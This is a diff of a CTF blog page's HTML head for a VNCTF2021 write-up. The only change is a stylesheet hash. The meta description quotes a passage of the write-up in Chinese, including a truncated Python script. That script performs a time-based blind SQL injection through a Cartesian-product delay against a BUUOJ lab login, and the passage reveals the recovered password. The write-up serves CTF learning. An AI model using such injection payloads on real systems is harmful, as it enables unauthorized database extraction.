@@ -13,7 +13,7 @@ realezjvav[复现] 第一关是一个笛卡尔积注入，其实当时fuzz出来
 自己写的脚本：（本来想用三个table的组合，会延时1s左右，但是不知道为啥有时候正常的请求会有5s的延时，所以改用两个table加一个column，这样大概会有13秒左右的延时，然后时差&amp;gt;10s即可；time.sleep(0.1)是怕buu的容器429Too Many Requests）
 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  import requests import time url = &amp;#34;http://0ce14b29-a69c-47eb-9aa1-2c0c972e4125.node3.buuoj.cn/user/login&amp;#34; ans = &amp;#34;&amp;#34; for i in range(1, 100): flag = 1 for j in range(31,127): # password：no_0ne_kn0w_th1s payload = &amp;#34;1&amp;#39; and if(ascii(substr(password,&amp;#34;+ str(i) +&amp;#34;,1))&amp;gt;&amp;#34;+ str(j) +&amp;#34;,0,(SELECT count(*) FROM information_schema."><title>VNCTF2021</title>
 <link rel=canonical href=https://k1te.cn/2021/03/14/vnctf/>
-<link rel=stylesheet href=/scss/style.min.bbcfef3c56489f1f37b552146da519e6b6a74a4c92792bcc512c78e2f55f25e1.css><meta property="og:title" content="VNCTF2021">
+<link rel=stylesheet href=/scss/style.min.445f140069a334e0a849a507486c823ccc053246a20296cb62e77ff22191eb8b.css><meta property="og:title" content="VNCTF2021">
 <meta property="og:description" content="Ezgame 在网上找到这个游戏的源码，然后在game.js中搜索win关键词，发现当winTimer.IsSet()返回True时，游戏胜利。
 然后在其他文件里找找，就可以在gameEngine.js中找到Timer类的isSet方法：
  IsSet() { return this.endTime &amp;gt; 0; }
